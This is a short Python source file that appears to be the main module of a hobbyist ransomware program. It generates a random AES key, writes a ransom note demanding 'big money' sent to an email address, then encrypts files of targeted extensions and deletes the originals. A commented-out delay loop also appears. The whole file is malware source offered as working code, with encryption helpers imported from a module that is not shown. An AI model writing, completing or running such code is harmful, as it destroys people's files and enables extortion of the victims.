from functions import *
import time

def sleep(seconds):
    start_time = time.time()
    elapsed_time = 0
    while elapsed_time < seconds:
        current_time = time.time()
        elapsed_time = current_time - start_time
        for _ in range(100):
            pass

def write_info(code):
    info_text = f'''Unlucky! :/ You clicked the funny exe file. All of your files have now been changed! 
To get them back to normal, send big money and your encryption code to email@email.com

CODE IS HERE:
{code}'''
    
    with open(info_file, "w") as f:
        f.write(info_text)

def encrypt_files(key):
    for file in find_files(extensions):
        with open(file, "rb") as f:
            data = f.read()
        with open(file + custom_extension, "wb") as f:
            f.write(aes_operation(key, data, 'enc'))
        os.remove(file)

def main():
    if os.path.exists(info_file):
        os._exit(1)
    #i = 0
    # while i < 1000000000:
        #i += 1
    #sleep(1)
    key = os.urandom(32)
    write_info(base64.b64encode(key).decode('utf-8'))
    encrypt_files(key)

if __name__ == "__main__":
    main()